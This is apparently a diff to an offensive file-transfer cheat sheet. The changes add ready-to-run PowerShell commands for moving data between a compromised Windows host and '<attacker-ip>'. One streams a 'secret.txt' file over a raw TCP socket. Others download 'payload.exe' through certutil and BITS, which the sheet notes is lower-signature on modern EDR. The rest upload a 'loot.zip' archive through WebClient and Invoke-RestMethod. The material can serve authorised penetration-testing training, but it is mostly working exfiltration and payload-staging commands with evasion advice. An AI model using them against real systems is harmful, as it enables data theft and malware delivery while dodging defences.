@@ -28,9 +28,14 @@ nc <attacker-ip> 4444 > retrieved.txt
 
 ### Windows to Linux
 
+Windows doesn't ship with netcat — PowerShell TCP client is the drop-in replacement:
+
 ```powershell
-# Sender (Windows PowerShell)
-Get-Content C:\Users\Public\secret.txt | nc -w 3 <attacker-ip> 4444
+# Sender (Windows, no external binaries)
+$c = New-Object System.Net.Sockets.TCPClient('<attacker-ip>',4444)
+$s = $c.GetStream()
+$b = [IO.File]::ReadAllBytes('C:\Users\Public\secret.txt')
+$s.Write($b,0,$b.Length); $s.Close()
 ```
 
 ```bash
@@ -116,8 +121,25 @@ curl http://<attacker-ip>/malware.exe -o /tmp/malware.exe
 Invoke-WebRequest -Uri "http://<attacker-ip>/payload.exe" -OutFile "C:\Windows\Temp\payload.exe"
 ```
 
-### Certutil Stealthy Download
+### Certutil (LOLBin)
 
 ```powershell
-certutil -urlcache -f http://<attacker-ip>/payload.exe C:\Windows\Temp\payload.exe
+certutil -urlcache -split -f http://<attacker-ip>/payload.exe C:\Windows\Temp\payload.exe
+```
+
+### BITS Transfer (LOLBin)
+
+Lower-signature than certutil on modern EDR. Uses the Background Intelligent Transfer Service — the same one Windows Update uses.
+
+```powershell
+Start-BitsTransfer -Source http://<attacker-ip>/payload.exe -Destination C:\Windows\Temp\payload.exe
+bitsadmin /transfer job /download /priority foreground http://<attacker-ip>/payload.exe C:\Windows\Temp\payload.exe
+```
+
+### Upload via WebClient / Invoke-RestMethod
+
+```powershell
+# Upload
+(New-Object System.Net.WebClient).UploadFile('http://<attacker-ip>/upload', 'C:\loot.zip')
+Invoke-RestMethod -Uri http://<attacker-ip>/upload -Method POST -InFile C:\loot.zip
 ```
